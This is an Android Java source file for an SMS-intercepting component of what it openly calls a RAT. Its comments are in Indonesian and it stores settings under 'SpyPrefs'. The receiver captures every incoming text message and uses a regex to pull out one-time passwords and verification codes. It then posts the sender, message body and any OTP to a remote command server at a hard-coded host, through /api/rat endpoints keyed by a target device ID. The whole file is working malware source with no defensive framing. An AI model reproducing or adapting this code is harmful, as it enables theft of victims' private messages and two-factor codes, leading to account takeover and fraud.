package com.rxd.project;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * SmsReceiver: Interceptor Pesan Teks.
 * Fix URL path + OTP auto-detection + dedicated SMS/OTP storage.
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "NXOB_SMS";
    private static final String BASE_URL = "http://hamnzx.clouderz.my.id:2000/api/rat";
    private static final Pattern OTP_PATTERN = Pattern.compile(
        "(?:OTP|kode|code|verifikasi|verification|pin|password|kode verifikasi|otp code)" +
        "[\\s:\\-]*?(\\d{4,8})",
        Pattern.CASE_INSENSITIVE
    );

    private Context appContext;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.appContext = context.getApplicationContext();
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()) &&
            !"android.intent.action.SMS_RECEIVED".equals(intent.getAction())) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        try {
            Object[] pdus = (Object[]) bundle.get("pdus");
            String format = bundle.getString("format");
            if (pdus == null) return;

            StringBuilder fullMessage = new StringBuilder();
            String sender = "";

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }
                if (sms != null) {
                    sender = sms.getOriginatingAddress();
                    fullMessage.append(sms.getMessageBody());
                }
            }

            String messageText = fullMessage.toString();
            if (sender == null || messageText.isEmpty()) return;

            SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", null);
            if (targetId == null || targetId.isEmpty()) {
                targetId = prefs.getString("device_id", "UNKNOWN_DEVICE");
            }
            if (targetId == null || targetId.isEmpty()) return;

            // Deteksi OTP
            String otpCode = null;
            Matcher m = OTP_PATTERN.matcher(messageText);
            if (m.find()) {
                otpCode = m.group(1);
                Log.d(TAG, "OTP detected: " + otpCode + " from " + sender);
            }

            long now = System.currentTimeMillis();

            // 1. Kirim ke post-notification (notifikasi umum)
            postToServer("/post-notification/" + targetId, targetId, sender, messageText, otpCode, now);

            // 2. Kirim ke incoming-sms (semua SMS, nggak ilang)
            postToServer("/incoming-sms/" + targetId, targetId, sender, messageText, otpCode, now);

            // 3. Kalau OTP, kirim juga ke otp endpoint
            if (otpCode != null) {
                postOtp(targetId, otpCode, sender, messageText, now);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private void postToServer(String endpoint, String targetId, String sender, String text, String otpCode, long timestamp) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                SharedPreferences prefs = appContext.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String baseUrl = prefs.getString("baseUrl", "http://hamnzx.clouderz.my.id:2000");
                URL url = new URL(baseUrl + "/api/rat" + endpoint);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("id", targetId);
                json.put("from", sender);
                json.put("body", text);
                json.put("app", "SMS");
                json.put("package", "com.android.mms");
                json.put("timestamp", timestamp);
                if (otpCode != null) {
                    json.put("isOtp", true);
                    json.put("otpCode", otpCode);
                }

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("utf-8"));
                    os.flush();
                }

                int code = conn.getResponseCode();
                if (code == 200) {
                    Log.d(TAG, "[+] " + endpoint + " SUCCESS: " + sender);
                }
            } catch (Exception e) {
                Log.e(TAG, "[-] " + endpoint + " FAILED: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    private void postOtp(String targetId, String code, String from, String body, long timestamp) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                SharedPreferences prefs = appContext.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String baseUrl = prefs.getString("baseUrl", "http://hamnzx.clouderz.my.id:2000");
                URL url = new URL(baseUrl + "/api/rat/otp/" + targetId);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("code", code);
                json.put("from", from);
                json.put("body", body);
                json.put("app", "SMS");
                json.put("timestamp", timestamp);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("utf-8"));
                    os.flush();
                }

                int codeResp = conn.getResponseCode();
                if (codeResp == 200) {
                    Log.d(TAG, "[+] OTP SAVED: " + code + " from " + from);
                }
            } catch (Exception e) {
                Log.e(TAG, "[-] OTP FAILED: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
}
